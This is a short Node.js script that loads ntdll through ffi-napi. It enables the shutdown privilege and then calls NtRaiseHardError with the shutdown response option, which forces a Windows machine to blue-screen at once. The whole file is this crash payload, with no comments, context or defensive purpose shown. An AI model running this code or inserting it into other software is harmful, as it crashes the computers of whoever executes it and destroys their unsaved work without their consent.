const ffi = require('ffi-napi');
const ref = require('ref-napi');

const ntdll = ffi.Library('ntdll', {
    'RtlAdjustPrivilege': ['int', ['uint', 'bool', 'bool', ref.refType('bool')]],
    'NtRaiseHardError': ['int', ['uint', 'uint', 'uint', 'pointer', 'uint', ref.refType('uint')]]
});

const enabled = ref.alloc('bool');
const response = ref.alloc('uint');

ntdll.RtlAdjustPrivilege(19, true, false, enabled);
ntdll.NtRaiseHardError(0xC0000420, 0, 0, null, 6, response);

